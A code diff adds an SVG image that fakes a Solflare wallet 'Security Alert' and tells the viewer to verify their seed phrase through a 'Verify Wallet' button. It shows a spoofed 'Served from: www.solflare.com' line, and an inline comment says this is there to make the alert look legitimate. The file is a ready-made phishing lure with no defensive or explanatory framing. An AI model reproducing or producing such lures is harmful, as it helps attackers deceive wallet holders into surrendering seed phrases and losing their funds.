@@ -1,0 +1,40 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg width="600" height="400" xmlns="http://www.w3.org/2000/svg">
+  <style>
+    .bg { fill: #1a1a2e; }
+    .card { fill: #16213e; rx: 12; }
+    .warn { fill: #ff6b35; }
+    .title { fill: #ffffff; font-family: sans-serif; font-size: 22px; font-weight: bold; }
+    .body { fill: #a8b2d8; font-family: sans-serif; font-size: 14px; }
+    .btn { fill: #ff6b35; rx: 8; }
+    .btntext { fill: #ffffff; font-family: sans-serif; font-size: 14px; font-weight: bold; }
+    .small { fill: #6c7293; font-family: sans-serif; font-size: 11px; }
+    .domain { fill: #4fc3f7; font-family: monospace; font-size: 12px; }
+  </style>
+
+  <!-- Background -->
+  <rect width="600" height="400" class="bg"/>
+
+  <!-- Card -->
+  <rect x="40" y="40" width="520" height="320" rx="12" class="card"/>
+
+  <!-- Warning icon area -->
+  <circle cx="300" cy="105" r="30" fill="#ff6b35" opacity="0.2"/>
+  <text x="300" y="115" text-anchor="middle" font-size="28" fill="#ff6b35">⚠</text>
+
+  <!-- Title -->
+  <text x="300" y="165" text-anchor="middle" class="title">Security Alert</text>
+
+  <!-- Body text -->
+  <text x="300" y="200" text-anchor="middle" class="body">Unusual sign-in activity detected on your</text>
+  <text x="300" y="220" text-anchor="middle" class="body">Solflare wallet. Verify your seed phrase</text>
+  <text x="300" y="240" text-anchor="middle" class="body">to secure your funds immediately.</text>
+
+  <!-- CTA Button -->
+  <rect x="170" y="265" width="260" height="40" rx="8" fill="#ff6b35"/>
+  <text x="300" y="291" text-anchor="middle" class="btntext">Verify Wallet →</text>
+
+  <!-- Domain indicator (makes it look legitimate) -->
+  <text x="300" y="340" text-anchor="middle" class="small">Served from:</text>
+  <text x="300" y="358" text-anchor="middle" class="domain">www.solflare.com</text>
+</svg>
